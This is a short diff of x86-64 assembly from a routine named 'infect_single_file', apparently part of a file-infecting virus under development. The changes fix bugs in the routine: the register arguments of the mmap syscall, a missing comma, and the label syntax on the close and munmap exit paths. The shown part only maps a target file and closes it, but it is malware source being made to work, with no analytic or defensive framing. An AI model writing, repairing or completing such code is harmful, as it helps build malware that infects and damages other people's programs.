@@ -379,12 +379,12 @@ infect_single_file:
     ; (rdi, rsi, rdx, rcx, r8, r9)
     ; mmap file contents to buffer
     mov rdi, 0
-    mov rdi, rax
+    mov rsi, rax
     mov rdx, PROT_READ
-    mov rcx, MAP_PRIVATE
+    mov r10, MAP_PRIVATE
     mov r8, r8 ; fd is already in r8
     mov r9, 0
-    mov rax SYS_MMAP
+    mov rax, SYS_MMAP
     syscall
 
     ; rax should have the mmap address and contents....
@@ -416,14 +416,14 @@ infect_single_file:
     ; jmp exit_ok
 
 
-.close
+.close:
     mov rdi, r8
     mov rax, SYS_CLOSE
     syscall
-    jmp ret
+    jmp .ret
 
-.munmap
-    jmp ret
+.munmap:
+    jmp .ret
 
 .ret:
 	pop r10
